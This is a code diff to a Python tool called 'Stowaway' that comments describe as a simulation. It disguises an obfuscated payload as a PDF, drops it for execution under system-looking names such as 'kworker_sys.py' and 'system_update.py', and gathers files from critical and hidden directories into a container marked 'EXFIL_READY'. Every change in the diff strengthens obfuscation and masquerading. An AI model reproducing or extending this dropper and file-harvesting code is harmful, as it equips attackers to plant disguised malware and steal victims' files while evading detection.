@@ -14,22 +14,23 @@ import base64
 import json
 import subprocess
 
-# Simple XOR encryption for simulation (Obfuscation)
-def xor_crypt(data, key):
-    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])
+# Import utils for heavy obfuscation
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+import utils
 
 class Stowaway:
     def __init__(self, mode="INJECTOR", target_dir="/tmp", payload_path=None):
         self.mode = mode
         self.target_dir = target_dir
-        self.key = secrets.token_bytes(16)
+        self.key = secrets.token_bytes(32) # Harder key
         self.body = b""
+        self.fake_type = "PDF" # Masquerade as PDF by default
 
         # Load payload if Injector
         if self.mode == "INJECTOR" and payload_path:
             try:
                 with open(payload_path, 'rb') as f:
-                    self.body = xor_crypt(f.read(), self.key)
+                    self.body = utils.obfuscate_payload(f.read(), self.key, self.fake_type)
             except: pass
 
     def deploy(self, drop_path):
@@ -37,11 +38,21 @@ class Stowaway:
         container = {
             "mode": self.mode,
             "key": base64.b64encode(self.key).decode('utf-8'),
-            "body": base64.b64encode(self.body).decode('utf-8')
+            "body": base64.b64encode(self.body).decode('utf-8'),
+            "type": self.fake_type
         }
-        # Save as a benign looking file (e.g., driver.sys or image.dat)
+
+        # If mimicking a file, we might just write the raw bytes if it was self-extracting,
+        # but for this sim we wrap in JSON for the 'dumper' tool to read.
+        # Ideally, a real stowaway would be a Polyglot.
+
+        # For HEAVY obfuscation: Rename to match fake type
+        if not drop_path.lower().endswith(".pdf"):
+            drop_path += ".pdf"
+
         with open(drop_path, 'w') as f:
             json.dump(container, f)
+        return drop_path
 
     @staticmethod
     def activate(drop_path, target_dir):
@@ -53,13 +64,16 @@ class Stowaway:
             mode = container["mode"]
             key = base64.b64decode(container["key"])
             body_enc = base64.b64decode(container["body"])
+            fake_type = container.get("type", "PDF")
 
             if mode == "INJECTOR":
                 # Decrypt payload
-                payload_code = xor_crypt(body_enc, key)
+                payload_code = utils.deobfuscate_payload(body_enc, key, fake_type)
 
-                # Drop and Execute Payload (e.g., malware.py)
-                malware_path = os.path.join(target_dir, f"service_{1000 + secrets.randbelow(9000)}.py")
+                # Drop and Execute Payload (e.g., malware.py) - Masquerade Name
+                name_pool = ["kworker_sys.py", "dbus_daemon.py", "system_update.py"]
+                malware_path = os.path.join(target_dir, secrets.choice(name_pool))
+
                 with open(malware_path, 'wb') as f:
                     f.write(payload_code)
 
@@ -71,7 +85,7 @@ class Stowaway:
                 # Scan for critical AND hidden files, encrypt into body, update self
                 loot = b""
 
-                # 1. Critical Directory
+                # 1. Critical Directory (Chunked Read)
                 critical_dir = os.path.join(target_dir, "critical")
                 if os.path.exists(critical_dir):
                     for f in os.listdir(critical_dir):
@@ -80,7 +94,8 @@ class Stowaway:
                             if os.path.isfile(path):
                                 loot += f"\n--- {f} ---\n".encode()
                                 with open(path, 'rb') as tf:
-                                    loot += tf.read()
+                                    while chunk := tf.read(8192): # Chunking 8KB
+                                        loot += chunk
                         except: pass
 
                 # 2. Hidden Assets in War Zone
@@ -93,17 +108,19 @@ class Stowaway:
                                     path = os.path.join(root, f)
                                     loot += f"\n--- {f} ---\n".encode()
                                     with open(path, 'rb') as tf:
-                                        loot += tf.read()
+                                        while chunk := tf.read(8192):
+                                            loot += chunk
                                 except: pass
 
-                    # Re-encrypt self with loot
-                    new_body = xor_crypt(loot, key)
+                    # Re-encrypt self with loot using heavy obfuscation
+                    # Note: We append loot to existing body or replace? Usually carrier starts empty.
+                    new_body = utils.obfuscate_payload(loot, key, fake_type)
                     container["body"] = base64.b64encode(new_body).decode('utf-8')
                     container["status"] = "EXFIL_READY"
 
                     with open(drop_path, 'w') as f:
                         json.dump(container, f)
-                    print(f"[STOWAWAY] Exfiltrated {len(loot)} bytes to container.")
+                    print(f"[STOWAWAY] Exfiltrated {len(loot)} bytes (raw) to container.")
 
         except Exception as e:
             print(f"[STOWAWAY] Activation Failed: {e}")
